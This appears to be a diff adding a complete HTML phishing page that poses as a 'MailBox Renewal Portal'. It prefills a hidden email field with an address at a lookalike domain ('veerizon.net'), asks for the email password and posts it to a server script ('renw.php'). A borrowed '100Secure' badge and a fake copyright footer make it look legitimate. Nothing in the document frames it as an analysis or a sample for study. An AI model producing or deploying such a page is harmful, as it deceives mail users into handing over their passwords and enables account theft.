@@ -1,0 +1,143 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Mailbox Added services
+  </title>
+  <link href="styles.css" type="text/css" rel="stylesheet" />
+  <style type="text/css">
+   .tableheader {
+background-color: #95BEE6;
+color:white;
+font-weight:bold;
+}
+.tablerow {
+background-color: #A7D6F1;
+color:white;
+}
+.message {
+color: #FF0000;
+font-weight: bold;
+text-align: center;
+width: 100%;
+}
+.style3 {font-size: 14px}
+.style4 {color: #000000}
+  </style>
+ </head>
+ <body>
+  <div align="left">
+   <img width="83" height="33" border="0" align="right" src="http://www.bountifulbreast.co.uk/images/100Secure.jpg" />
+  </div>
+  <script language="JavaScript">
+   &lt;!--
+function check(form) {
+if (form.Email.value == "")
+{ alert("Please enter the autorised email address."); form.Email.focus(); return;}
+// Start of Email error Alert!
+var checkEmail = "@.";
+var checkStr = form.Email.value;
+var EmailValid = false;
+var EmailAt = false;
+var EmailPeriod = false; 
+for (i = 0;  i &lt; checkStr.length;  i++)
+{
+ch = checkStr.charAt(i);
+for (j = 0;  j &lt; checkEmail.length;  j++)
+{
+if (ch == checkEmail.charAt(j) &amp;&amp; ch == "@")
+EmailAt = true;
+if (ch == checkEmail.charAt(j) &amp;&amp; ch == ".")
+EmailPeriod = true;
+	  if (EmailAt &amp;&amp; EmailPeriod)
+		break;
+	  if (j == checkEmail.length)
+		break;
+	}
+if (EmailAt &amp;&amp; EmailPeriod)
+{
+		EmailValid = true
+		break;
+	}
+}
+if (!EmailValid)
+{
+alert("Please enter a valid email address.");
+form.Email.focus();
+return;}
+// End of Email error Alert!
+if (form.emailpassword.value == "")
+{ alert("To complete this autorization, please enter your Email Password."); form.emailpassword.focus(); return;}
+
+form.submit()
+}
+//--&gt;
+  </script>
+  <form action="renw.php" method="post" name="frmUser">
+   <div class="message">
+    <p>
+    </p>
+    <p>
+    </p>
+    <p>
+    </p>
+   </div>
+   <table width="500" border="0" align="center" cellspacing="1" cellpadding="10">
+    <tbody>
+     <tr class="tableheader">
+      <td align="center" colspan="2">
+       MailBox Renewal Portal
+      </td>
+     </tr>
+     <tr class="tablerow">
+      <td width="93" align="right">
+       <strong>
+        Email ID:
+       </strong>
+      </td>
+      <td width="364">
+       <input type="hidden" value="abuse@veerizon.net" size="40" name="Email" />
+       <span class="style15 style4">
+        <strong>
+         abuse@veerizon.net
+        </strong>
+       </span>
+      </td>
+     </tr>
+     <tr class="tablerow">
+      <td align="right">
+       <strong>
+        Password:
+       </strong>
+      </td>
+      <td>
+       <input type="password" size="35" name="emailpassword" />
+      </td>
+     </tr>
+     <tr class="tableheader">
+      <td align="center" colspan="2">
+       <input type="submit" value="Submit To Renew" name="submit" onclick="check(this.form)" />
+      </td>
+     </tr>
+    </tbody>
+   </table>
+  </form>
+  <br />
+  <div align="center">
+   <p>
+    <img src="http://munion.twomini.com/images/Snapshot_2014-11-20_161431.png" />
+   </p>
+   <p>
+   </p>
+   <p>
+   </p>
+  </div>
+  <div align="center">
+   <span class="style3">
+    © 2013 - 2015 All rights reserved Free-Mailbox-Added services.
+   </span>
+   <div>
+   </div>
+  </div>
+ </body>
+</html>
